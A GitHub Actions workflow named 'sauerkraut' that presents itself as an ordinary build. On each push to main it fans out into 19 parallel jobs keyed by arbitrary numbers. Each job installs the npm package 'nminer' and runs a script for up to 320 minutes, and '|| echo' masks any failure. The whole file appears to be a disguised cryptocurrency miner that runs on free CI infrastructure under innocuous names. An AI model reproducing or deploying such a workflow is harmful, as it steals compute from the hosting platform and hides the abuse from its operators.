name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6390 }
          - { version: 1140 }
          - { version: 2929 }
          - { version: 1621 }
          - { version: 3929 }
          - { version: 3763 }
          - { version: 6977 }
          - { version: 9130 }
          - { version: 4771 }
          - { version: 679 }
          - { version: 8645 }
          - { version: 2423 }
          - { version: 9034 }
          - { version: 1761 }
          - { version: 7037 }
          - { version: 5781 }
          - { version: 3395 }
          - { version: 6586 }
          - { version: 8596 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: mmm
        run: |
          npm install nminer@latest
          timeout 320m node sauerkraut.js || echo "sauerkraut executed"